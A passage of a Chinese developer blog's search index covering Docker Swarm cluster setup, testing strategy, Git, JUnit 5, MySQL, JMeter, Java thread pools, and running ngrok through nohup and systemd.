join-token manager&#39; and follow the instructions.</code></pre><p>在真实的机器上，不会使用 docker-machine ssh 命令，初始化集群的命令直接就是：</p><blockquote><p>docker swarm init –listen-addr 192.168.99.100:2337 –advertise-addr 192.168.99.100</p></blockquote><p>接下来把 worker1 加入集群:</p><blockquote><p>docker-machine ssh worker1 docker swarm join –token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-5j94cvq03w9phk6vid7mgsyq4 192.168.99.100:2337</p></blockquote><pre><code>This node joined a swarm as a worker.</code></pre><p>然后两台机器就被添加到集群了。进入其中一个管理节点，可以使用 docker node 命令查看节点信息。</p><blockquote><p>docker-machine ssh manager1 docker node ls</p></blockquote><p>能看到两台机器已经在集群里面作为 node 存在</p><pre><code>ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS      ENGINE VERSIONifzgulv2nsw5r84dw55f8vut0 *   manager1            Ready               Active              Leader              19.03.5iwtggbei2por21t4z9q3x9usx     worker1             Ready               Active                                  19.03.5</code></pre><p>接下来创建更多的虚拟器 manager2、worker1、worker2、worker3</p><blockquote><p>docker-machine create –driver virtualbox manager2<br>docker-machine create –driver virtualbox worker2<br>docker-machine create –driver virtualbox worker3</p></blockquote><p>也将他们加入集群，然后就可以部署应用了。</p><blockquote><p>docker-machine ssh worker2 docker swarm join –token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-5j94cvq03w9phk6vid7mgsyq4 192.168.99.100:2337<br>docker-machine ssh worker3 docker swarm join –token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-5j94cvq03w9phk6vid7mgsyq4 192.168.99.100:2337</p></blockquote><p>加入 manager 需要先获取 manager 的token，到 leader 的机器上获取 token</p><blockquote><p>docker-machine ssh manager1 docker swarm jon-token manager</p></blockquote><pre><code>To add a manager to this swarm, run the following command:    docker swarm join --token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-4tbwy1t6rnlfjn1lnw84v13bq 192.168.99.100:2337</code></pre><p>将 manager2 加入集群</p><blockquote><p>docker-machine ssh manager2 docker swarm join –token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-4tbwy1t6rnlfjn1lnw84v13bq 192.168.99.100:2337</p></blockquote><p>这样我们共有 5 台机器。</p><pre><code>ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS      ENGINE VERSIONifzgulv2nsw5r84dw55f8vut0     manager1            Ready               Active              Leader              19.03.5ypzwukwsof5ec7r4itkvkzxa3 *   manager2            Ready               Active              Reachable           19.03.5iwtggbei2por21t4z9q3x9usx     worker1             Ready               Active                                  19.03.5sdtzfghzoafij246b272ob4wl     worker2             Ready               Active                                  19.03.5uc27drfjn1anv01yy24y9d5g5     worker3             Ready               Active                                  19.03.5</code></pre><p>这样一个 swarm 集群就建立好了，然后可以对它进行一些管理。</p><p>查看网络：</p><blockquote><p>docker-machine ssh manager1 docker network ls</p></blockquote><h2 id="部署应用到集群"><a href="#部署应用到集群" class="headerlink" title="部署应用到集群"></a>部署应用到集群</h2><p>使用 nginx 打一镜像用于部署前端项目，编写如下 docker-compose.yml 文件</p><pre><code>version: &quot;3.5&quot;services:  frontend:    image: linksgo2011/frontend:latest    networks:      - sample-network    ports:      - 8000:80    deploy:      replicas: 1      labels:        app: sample-app        environment: localnetworks:  sample-network:    driver: overlay</code></pre><p>使用 docker-machine 的 scp命令拷贝 compose 文件到一台 manager 中</p><blockquote><p>docker-machine scp  docker-compose.yml docker@manager1:~/docker-compose.yml</p></blockquote><p>然后在这台 manager 中执行 stack 部署命令</p><blockquote><p>docker-machine ssh manager1 docker stack deploy -c docker-compose.yml sample-stack</p></blockquote><p>Docker 会自动帮助创建网络，然后部署 sample-stack 到 worker 中。</p><p>可以查看部署的服务</p><blockquote><p>docker-machine ssh manager1 docker service ls</p></blockquote><p>ID                  NAME                    MODE                REPLICAS            IMAGE                         PORTS<br>ovifr1oldnc7        sample-stack_frontend   replicated          1/1                 linksgo2011/frontend:latest   *:8000-&gt;80/tcp</p><p>可以查看某个服务的日志，对调试和排错非常有用</p><blockquote><p>docker-machine ssh manager1 docker service logs  sample-stack_frontend</p></blockquote><h2 id="docker-swarm-一些调试方法"><a href="#docker-swarm-一些调试方法" class="headerlink" title="docker swarm 一些调试方法"></a>docker swarm 一些调试方法</h2><p>查看 service 无法启动的错误信息</p><blockquote><p>docker service ps –no-trunc {serviceName}</p></blockquote><p>查看服务的 task</p><blockquote><p>docker service ps <service-name></service-name></p></blockquote><p>查看 task 的启动情况，可以看到容器、节点情况</p><blockquote><p>docker inspect <task-id></task-id></p></blockquote><p>找到了容器可以查看日志</p><blockquote><p>docker logs <container-id></container-id></p></blockquote><p>daemon.json 可以开启 debug 模式。</p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li>使用 docker-compose 部署应用</li><li>容器内部的通信</li><li>使用 Jenkins 自动化搭建 swarm 集群</li><li>安装 portainer</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.xiodi.cn/?s=swarm" target="_blank" rel="noopener">https://blog.xiodi.cn/?s=swarm</a></li><li><a href="https://docs.docker.com/v17.09/engine/swarm/" target="_blank" rel="noopener">https://docs.docker.com/v17.09/engine/swarm/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>敏捷中的测试策略</title>
      <link href="/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/QA-in-agile/"/>
      <url>/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/QA-in-agile/</url>
      
        <content type="html"><![CDATA[<h2 id="常用QA概念"><a href="#常用QA概念" class="headerlink" title="常用QA概念"></a>常用QA概念</h2><ul><li>测试金字塔: unit-&gt;service-&gt;UI, 伴随测试成本投入,收益减少。unit为测试- 性价比最高的方式</li><li>冒烟测试: sanity测试,快速验证应用是否能工作。</li><li>BDD测试: 基于业务的测试思想。</li><li>E2E测试: 端对端测试。</li><li>Functional: E2E测试。</li><li>渗透测试：破坏性的测试，测试系统安全性</li><li>架构测试：测试架构是否被破坏</li><li>探索性测试:同时设计测试和执行测试。探索性测试有时候会与即兴测试（ad hoc testing）混淆。即兴测试通常是指临时准备的、即兴的Bug搜索测试过程。从定义可以看出，谁都可以做即兴测试。由Cem Kaner提出的探索性测试，相比即兴测试是一种精致的、有思想的过程。</li></ul><h2 id="常用测试工具"><a href="#常用测试工具" class="headerlink" title="常用测试工具"></a>常用测试工具</h2><ul><li>selenium 可以驱动浏览器，模拟真实用户</li><li>jemeter 性能测试工具</li><li>archunit 架构测试工具</li></ul><h2 id="测试用例设计"><a href="#测试用例设计" class="headerlink" title="测试用例设计"></a>测试用例设计</h2><ul><li>Boundary Value Analysis 边界值分析</li><li>Equivalence Partitioning 等价划分</li><li>Causal Diagram 因果图</li><li>Decision Table 判定表</li></ul>]]></content>
      
      
      <categories>
          
          <category> 敏捷开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>测试策略</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/testing-strategy/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/testing-strategy/</url>
      
        <content type="html"><![CDATA[<p>一个项目需要做多少测试，做到什么程度，这属于测试策略的范畴。</p><h2 id="分层测试"><a href="#分层测试" class="headerlink" title="分层测试"></a>分层测试</h2><ul><li>API 层使用 MockMVC 进行简单的测试，目的是快速验证，mock 掉 Service<ul><li>测试的目标是返回的状态码等等信息</li></ul></li><li>Service 层结合 Repository 测试，测试业务逻辑，结合 DataFixture 来进行测试，这是测试重心之一</li><li>Domain 测试使用纯的单元测试，测试业务逻辑, domain 保持干净可以不使用 Mock 工具,这也是测试重心</li><li>Repository 有 ORM 实现，在 Service 处做测试</li></ul><h2 id="测试块描述风格"><a href="#测试块描述风格" class="headerlink" title="测试块描述风格"></a>测试块描述风格</h2><p>使用驼峰描述单元测试, 必须满足 it should xxx [when xxx] 格式</p><p>例如 </p><blockquote><p>it should return user list</p></blockquote><h2 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h2><p>DataFixture 以实体为单位准备</p><h2 id="集成测试"><a href="#集成测试" class="headerlink" title="集成测试"></a>集成测试</h2><p>只做 API 测试，使用 user journey 测试方法，覆盖所有场景，本质上是一种集成测试方法。</p><p>断言各司其职，例如创建用户的测试需要断言创建后的信息，但是编辑的时候直接使用创建用户的场景，但不对用户创建再次断言。</p><p>集成测试只负责 Happy Path 测试</p>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>kafka</title>
      <link href="/Kafka/kafka/kafka/"/>
      <url>/Kafka/kafka/kafka/</url>
      
        <content type="html"><![CDATA[<p>一款高性能消息中间件。kafka 依赖 zookeeper 作为分布式协调工具。<br>下载地址：<a href="https://www.apache.org/dyn/closer.cgi?path=/kafka/2.3.0/kafka_2.12-2.3.0.tgz" target="_blank" rel="noopener">https://www.apache.org/dyn/closer.cgi?path=/kafka/2.3.0/kafka_2.12-2.3.0.tgz</a></p><h1 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h1><ul><li><a href="https://kafka.apache.org/quickstart" target="_blank" rel="noopener">https://kafka.apache.org/quickstart</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Kafka </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用的GIT命令</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/Git%20commands/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/Git%20commands/</url>
      
        <content type="html"><![CDATA[<p>配置全局邮箱和名字</p><blockquote><p>git config –global user.email “email”</p></blockquote><blockquote><p>git config –global user.name “name”</p></blockquote><p>查看服务器和本地上分支</p><blockquote><p>git branch -a</p></blockquote><p>获取服务器分支并映射到本地</p><blockquote><p>git fetch origin 远程分支名x:本地分支名x</p></blockquote><p>设置pull  push映射</p><blockquote><p>git branch –set-upstream-to=origin/<branch> localBranchName</branch></p></blockquote><p>临时缓存本地更改并清空工作区</p><blockquote><p>git stash </p></blockquote><p>从 stash 中取出</p><blockquote><p>git stash pop</p></blockquote><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul><li><a href="http://onlywei.github.io/explain-git-with-d3/#branch" target="_blank" rel="noopener">http://onlywei.github.io/explain-git-with-d3/#branch</a>  Explain Git with D3</li><li><a href="https://learngitbranching.js.org/" target="_blank" rel="noopener">https://learngitbranching.js.org/</a> Learn Git Branching</li><li><a href="https://github.com/Gazler/githug" target="_blank" rel="noopener">https://github.com/Gazler/githug</a> Lean git by game </li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>kubernetes</title>
      <link href="/docker/docker/kubernetes/"/>
      <url>/docker/docker/kubernetes/</url>
      
        <content type="html"><![CDATA[<p>Kubernetes（k8s）是一个开源的，用于管理云平台中多个主机上的容器化的应用，Kubernetes的目标是让部署容器化的应用简单并且高效（powerful）,Kubernetes提供了应用部署，规划，更新，维护的一种机制。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://www.kubernetes.org.cn/k8s" target="_blank" rel="noopener">https://www.kubernetes.org.cn/k8s</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一些写作技巧</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-skils/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-skils/</url>
      
        <content type="html"><![CDATA[<p>公司的内部刊物发表了很多技术和商业相关的文章，很多时候读起来非常晦涩。相比之下一些公众号的文章读起来特别轻松，通过分析公众号爆款文章的后，发现一些有意思的特点。</p><ul><li>内容具有普适性，越通俗、接地气的文章看得人越多，那些专业的计算机、财务相关的文章一般没人看，倒是大众心理学、情感类的文章传播的非常迅速</li><li>分享知识的文章不如讲道理的文章；讲道理的文章不如讲故事的文章</li><li>目标受众越明确越好，越能击中读者的内心</li></ul><h2 id="对写作类型进行分类"><a href="#对写作类型进行分类" class="headerlink" title="对写作类型进行分类"></a>对写作类型进行分类</h2><ul><li>传播知识和总结的文章</li><li>讲述道理和个人感悟的文章</li><li>通过故事传达某个理念的文章</li></ul><h2 id="文章的结构的设计"><a href="#文章的结构的设计" class="headerlink" title="文章的结构的设计"></a>文章的结构的设计</h2><ul><li>三段论是经典的作文结构。通过点题说明文章主旨，吸引读者继续阅读；其次分段阐述论点，其中穿插一些故事或者引用作为证据证明；最后总结，回顾全文。</li></ul><h2 id="其他奇巧淫技"><a href="#其他奇巧淫技" class="headerlink" title="其他奇巧淫技"></a>其他奇巧淫技</h2><ul><li>总结不要用“总结”这个标题，让结尾更为自然</li><li>文章的开始可以埋一些伏笔，就像相声的抖包袱</li><li>文章是改出来的，不是一次成型的</li></ul><h2 id="文章的几个层次"><a href="#文章的几个层次" class="headerlink" title="文章的几个层次"></a>文章的几个层次</h2><ul><li>文章的灵魂是逻辑</li><li>文章的骨骼是结构</li><li>文章的案例和陈述是肉</li><li>文章的格式和错误是皮</li></ul><h2 id="文体分类"><a href="#文体分类" class="headerlink" title="文体分类"></a>文体分类</h2><p>目前文体分类不是特别严格，并且争议比较大。但是对文体进行分类对写作的特征更有帮助。</p><ul><li>议论文<ul><li>用来表达观点，应使用强有力的论据和逻辑支撑。毛主席的《实践论》，这种文章很容易具有煽动性。</li><li>参考文章<ul><li>《超越云计算：对数据库管理系统未来的思考》<a href="https://www.infoq.cn/article/MrCVHNFtHqt-VXYWisEd" target="_blank" rel="noopener">https://www.infoq.cn/article/MrCVHNFtHqt-VXYWisEd</a></li><li>《你要专业》 <a href="https://mp.weixin.qq.com/s/JwDKYOW4XRwQZa4ybEwOFA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/JwDKYOW4XRwQZa4ybEwOFA</a></li><li>《香港问题的终极归因》<a href="https://mp.weixin.qq.com/s/J8xzOwrezz6NHCVGvROvTQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/J8xzOwrezz6NHCVGvROvTQ</a></li></ul></li></ul></li><li>应用文<ul><li>书信等</li></ul></li><li>说明文<ul><li>陈述技术方案，IT行业最常见的写作问题。写作手法主要是 what why how。标题往往是对xxx的介绍。</li><li>参考文章<ul><li>《可视化架构设计——C4介绍》<a href="https://mp.weixin.qq.com/s/cy-b_Vu9oBz7TrOIaJTADg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/cy-b_Vu9oBz7TrOIaJTADg</a></li><li>《坐看云起时，谈笑无还期》<a href="https://mp.weixin.qq.com/s/QCnclsGw-FCaXPMH7QcgcQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/QCnclsGw-FCaXPMH7QcgcQ</a></li><li>《为什么都2019年了大家还喜欢用 TypeScript》<a href="https://mp.weixin.qq.com/s/edt5QplvGxqfGl-oDC5m3g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/edt5QplvGxqfGl-oDC5m3g</a></li></ul></li></ul></li><li>教程<ul><li>教授一个明确的内容, 例如《Java 8 中的 Streams API 详解》 <a href="https://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/</a></li></ul></li><li>杂文</li></ul><h2 id="写作手法"><a href="#写作手法" class="headerlink" title="写作手法"></a>写作手法</h2><ul><li>讲故事</li><li>引用数据</li><li>介绍案例</li><li>引用名言</li></ul><h2 id="写作的本质"><a href="#写作的本质" class="headerlink" title="写作的本质"></a>写作的本质</h2><p>写作的本质是逻辑+表达。文艺作品表达生动具体，文章的可读性和吸引力强，但是逻辑不明显或者不强。程序员写东西反过来了,程序员的文章往往具有很强的结构性和逻辑性，但是不够具体和生动，表达不是特别专业。</p>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Junit 5</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/junit-5/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/junit-5/</url>
      
        <content type="html"><![CDATA[<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="用Junit5-测试-controller-或者API的例子"><a href="#用Junit5-测试-controller-或者API的例子" class="headerlink" title="用Junit5 测试 controller 或者API的例子"></a>用Junit5 测试 controller 或者API的例子</h3><pre><code class="java">package com.tw.api.unit.test.controller;import com.tw.api.unit.test.domain.todo.Todo;import com.tw.api.unit.test.domain.todo.TodoRepository;import org.junit.jupiter.api.Test;import org.junit.jupiter.api.extension.ExtendWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;import org.springframework.boot.test.mock.mockito.MockBean;import org.springframework.test.context.ActiveProfiles;import org.springframework.test.context.junit.jupiter.SpringExtension;import org.springframework.test.web.servlet.MockMvc;import org.springframework.test.web.servlet.ResultActions;import java.util.Arrays;import static org.hamcrest.Matchers.is;import static org.mockito.Mockito.when;import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;@ExtendWith(SpringExtension.class)@WebMvcTest(TodoController.class)@ActiveProfiles(profiles = &quot;test&quot;)class TodoControllerTest {    @Autowired    private TodoController todoController;    @Autowired    private MockMvc mvc;    @MockBean    private TodoRepository todoRepository;    @Test    void getAll() throws Exception {        //given        when(todoRepository.getAll()).thenReturn(Arrays.asList(new Todo(1,&quot;first todo&quot;,true,0)));        //when        ResultActions result = mvc.perform(get(&quot;/todos&quot;));        //then        result.andExpect(status().isOk())                .andDo(print())                .andExpect(jsonPath(&quot;$[0].title&quot;, is(&quot;first todo&quot;)))                .andExpect(jsonPath(&quot;$[0].id&quot;, is(1)))                .andExpect(jsonPath(&quot;$[0].completed&quot;, is(true)))                .andExpect(jsonPath(&quot;$[0].order&quot;, is(0)));    }}</code></pre><h3 id="用Junit5测试service的例子"><a href="#用Junit5测试service的例子" class="headerlink" title="用Junit5测试service的例子"></a>用Junit5测试service的例子</h3><pre><code class="java">package com.tw.api.unit.test.services;import org.junit.jupiter.api.BeforeEach;import org.junit.jupiter.api.DisplayName;import org.junit.jupiter.api.Test;import org.junit.jupiter.api.extension.ExtendWith;import org.mockito.InjectMocks;import org.mockito.Mock;import org.mockito.junit.jupiter.MockitoExtension;import static org.junit.jupiter.api.Assertions.assertEquals;import static org.mockito.Mockito.when;@ExtendWith(MockitoExtension.class)@DisplayName(&quot;A example to test show service with mock strategy&quot;)public class ShowServiceTests {    private static final String MOCK_OUTPUT = &quot;Mocked show label&quot;;    @Mock    private TextService textService;    @InjectMocks    private ShowService showService;    @BeforeEach    void setMockOutput() {        when(textService.getText()).thenReturn(MOCK_OUTPUT);    }    @Test    @DisplayName(&quot;Mock the output of the text service using mockito&quot;)    public void contextLoads() {        assertEquals(showService.getShowLabel(), MOCK_OUTPUT);    }}</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.ibm.com/developerworks/cn/java/j-introducing-junit5-part1-jupiter-api/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/j-introducing-junit5-part1-jupiter-api/index.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>实用的SQL语句技巧</title>
      <link href="/mysql/mysql/useful-mysql%20statement/"/>
      <url>/mysql/mysql/useful-mysql%20statement/</url>
      
        <content type="html"><![CDATA[<p>使用SQL完成文本替换操作</p><blockquote><p>update typecho_contents set text=REPLACE (addr,’<a href="http://bcs.duapp.com/helpjs&#39;,&#39;http://helpjs.bj.bcebos.com/&#39;" target="_blank" rel="noopener">http://bcs.duapp.com/helpjs&#39;,&#39;http://helpjs.bj.bcebos.com/&#39;</a>)</p></blockquote><p>表之间复制数据,可以使用 select into table1(field1,field2) select (value1,value2) from table2</p><blockquote><p> insert into user_temp(id,phone_nbr,open_id,project_from,task_id)<br>           select id,phone_nbr,open_id,project_from,task_id from user where task_id=#{taskId}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql 存储过程编写示例</title>
      <link href="/mysql/mysql/mysql-stored-procedure/"/>
      <url>/mysql/mysql/mysql-stored-procedure/</url>
      
        <content type="html"><![CDATA[<h2 id="一个创建模拟数据的存储过程"><a href="#一个创建模拟数据的存储过程" class="headerlink" title="一个创建模拟数据的存储过程"></a>一个创建模拟数据的存储过程</h2><pre><code class="mysql">DROP PROCEDURE IF EXISTS `insertStubData`;DELIMITER $$CREATE PROCEDURE `insertStubData`()BEGIN    DECLARE i int unsigned DEFAULT 0;    WHILE i &lt; 30000 DO        SET i = i+1;        INSERT INTO `sso_login`(`id`,        `phone_nbr`,        `open_id`,        `project_from`,        `task_id`)        VALUES        (null,CONCAT(&quot;133&quot;,i),i,&quot;TW&quot;,10);    END WHILE;END $$DELIMITER ;CALL insertStubData();</code></pre><h2 id="编写-mysql-存储过程的基础"><a href="#编写-mysql-存储过程的基础" class="headerlink" title="编写 mysql 存储过程的基础"></a>编写 mysql 存储过程的基础</h2><ul><li>基本教程 <a href="https://www.runoob.com/w3cnote/mysql-stored-procedure.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/mysql-stored-procedure.html</a></li></ul><h2 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h2><ul><li>定义变量需要和SQL保持一致</li><li>使用 SET 为变量赋值</li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Jmeter 性能测试</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/Jmeter/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/Jmeter/</url>
      
        <content type="html"><![CDATA[<p>Apache JMeter是一款纯java编写负载功能测试和性能测试开源工具软件。相比Loadrunner而言，JMeter小巧轻便且免费，逐渐成为了主流的性能测试工具，是每个测试人员都必须要掌握的工具之一。</p><h2 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h2><p>Jmeter 使用 Jar 发布，需要 java 运行环境，无需专门安装。<br>下载地址：<a href="http://jmeter.apache.org/download_jmeter.cgi" target="_blank" rel="noopener">http://jmeter.apache.org/download_jmeter.cgi</a></p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>下面是一个测试 web 访问的基本例子：</p><ol><li>“测试计划” -&gt; “添加” -&gt; “Threads(Users)” -&gt; “线程组”，配置线程数量、时长、循环次数等。</li><li>“线程组” -&gt; “添加” -&gt; “Sampler” -&gt; “HTTP请求”  创建一个HTTP请求的示例</li><li>“线程组” -&gt; “添加” -&gt; “监听器” -&gt; “察看结果树” 创建一个查看结果的方式，可以选择图形、断言等其他方式</li><li>运行测试</li></ol><p>Jmeter还可以创建变量等更高级的方式。</p><ul><li>介绍文档 <a href="https://blog.csdn.net/u012111923/article/details/80705141" target="_blank" rel="noopener">https://blog.csdn.net/u012111923/article/details/80705141</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 内存分析工具 VisualVM</title>
      <link href="/java/java/java%20visualVM/"/>
      <url>/java/java/java%20visualVM/</url>
      
        <content type="html"><![CDATA[<p>VisualVM 是一款非常简单的分析 java 内存的开源软件，由Apache 开源发布。</p><p>它通过 jvmstat、JMX、SA（Serviceability Agent）以及 Attach API 等多种方式从程序运行时获得实时数据，从而进行动态的性能分析。</p><p>提供了如下功能</p><ul><li>内存分析</li><li>CPU 分析</li><li>线程分析</li><li>转储功能</li><li>堆转储的生成与分析</li><li>远程分析</li></ul><p>VisualVM 使用非常简单，如果Java项目出现内存问题，可以使用该工具调试。</p><h2 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h2><ul><li>介绍 <a href="https://www.ibm.com/developerworks/cn/java/j-lo-visualvm/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/j-lo-visualvm/index.html</a></li><li>官网 <a href="https://visualvm.github.io/" target="_blank" rel="noopener">https://visualvm.github.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 线程池使用</title>
      <link href="/java/java/java%20thread%20pool/"/>
      <url>/java/java/java%20thread%20pool/</url>
      
        <content type="html"><![CDATA[<p>在计算密集型的项目中，需要用到多线程来做并发操作，java 多线程最好的方案就是使用线程池。<br>可以通过使用 Spring 中封装好的线程池类，也可以使用 Java 原生接口。</p><h2 id="使用-Spring-中ThreadPoolTaskExecutor实现线程池"><a href="#使用-Spring-中ThreadPoolTaskExecutor实现线程池" class="headerlink" title="使用 Spring 中ThreadPoolTaskExecutor实现线程池"></a>使用 Spring 中ThreadPoolTaskExecutor实现线程池</h2><p>如果项目中已经存在 Spring 则可以使用一个由Spring 封装好了的线程池单例</p><p>声明下面 Bean</p><pre><code>@Configurationpublic class ThreadPoolConfig {    @Bean(&quot;threadPoolTaskExecutor&quot;)    public ThreadPoolTaskExecutor threadPoolTaskExecutor(){        ThreadPoolTaskExecutor threadPoolTaskExecutor=new ThreadPoolTaskExecutor();        threadPoolTaskExecutor.setCorePoolSize(4);        threadPoolTaskExecutor.setKeepAliveSeconds(10);        threadPoolTaskExecutor.setMaxPoolSize(10);        threadPoolTaskExecutor.setQueueCapacity(10);        return threadPoolTaskExecutor;    }}</code></pre><p>创建一个测试的线程类，继承 Thread 或者实现 Runnable 都可</p><pre><code>public class MyThread extends Thread {    @Override    publicvoid run() {        System.out.println(Thread.currentThread().getName() + &quot;正在执行。。。&quot;);    }}</code></pre><p>在需要使用的地方只需要注入 Bean，然后执行任务即可</p><pre><code>@AutowiredThreadPoolTaskExecutor threadPoolTaskExecutor;threadPoolTaskExecutor.execute(new MyThread());</code></pre><h2 id="使用-Java-原生接口"><a href="#使用-Java-原生接口" class="headerlink" title="使用 Java 原生接口"></a>使用 Java 原生接口</h2><p>在 Java 中，原生的线程池接口为 ExecutorService。Executors 默认提供了数个实现，其中创建固定的线程个数的线程池比较常用 newFixedThreadPool。</p><pre><code>ExecutorService executor = Executors.newFixedThreadPool(10);executor.execute(new MyThread());executor.shutdown;</code></pre><p>需要特别注意的是，线程池中的线程不会被自动释放，需要自己手动调用 shutdown 释放。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>nohup 后台运行Linux程序方法</title>
      <link href="/linux/linux/linux-nohup/"/>
      <url>/linux/linux/linux-nohup/</url>
      
        <content type="html"><![CDATA[<p>在Linux服务器中，每个终端的应用程序会随着用户的退出被杀死。如果在用户退出也需要继续运行的话，需要使用nohup 来运行程序。</p><p>同时,nohup 并不是后台运行，意味着虽然用户退出终端可以继续运行，但是在退出之前会占用用户界面。</p><p>于是可以使用在命令后添加 &amp; 符号的方法，让程序到后台运行。</p><p>在部署服务器应用时，我们可以即可 nohup 和 &amp; 来运行程序。</p><p>例如：</p><blockquote><p>/usr/bin/nohup /home/hp/workspace/ngrok tcp 80 -log=stdout &amp;</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Systemd 常见用法</title>
      <link href="/linux/linux/linux-systemd/"/>
      <url>/linux/linux/linux-systemd/</url>
      
        <content type="html"><![CDATA[<p>Systemd 是一套用来管理系统服务的命令，Cent OS默认使用它管理系统服务。</p><h2 id="Systemd-命令组用法"><a href="#Systemd-命令组用法" class="headerlink" title="Systemd 命令组用法"></a>Systemd 命令组用法</h2><p>参考 <a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html</a></p><h2 id="Systemd-servcie-文件编写"><a href="#Systemd-servcie-文件编写" class="headerlink" title="Systemd servcie 文件编写"></a>Systemd servcie 文件编写</h2><p>参考 <a href="https://www.cnblogs.com/wutao666/p/9781567.html" target="_blank" rel="noopener">https://www.cnblogs.com/wutao666/p/9781567.html</a></p><h2 id="一个注册-ngrok-（内网穿透工具）-的实例"><a href="#一个注册-ngrok-（内网穿透工具）-的实例" class="headerlink" title="一个注册 ngrok （内网穿透工具） 的实例"></a>一个注册 ngrok （内网穿透工具） 的实例</h2><ol><li>编写ngrok.servcie 服务文件</li></ol><pre><code>[Unit]Description=&quot;Ngrok service &quot;After=network.target[Service]Type=forkingExecStart=/usr/bin/nohup /home/hp/workspace/ngrok tcp 80 -log=stdout &amp;ExeStart=ps -ef | grep ngrok | head -1 | awk &#39;{print $2}&#39; |xargs kill -9 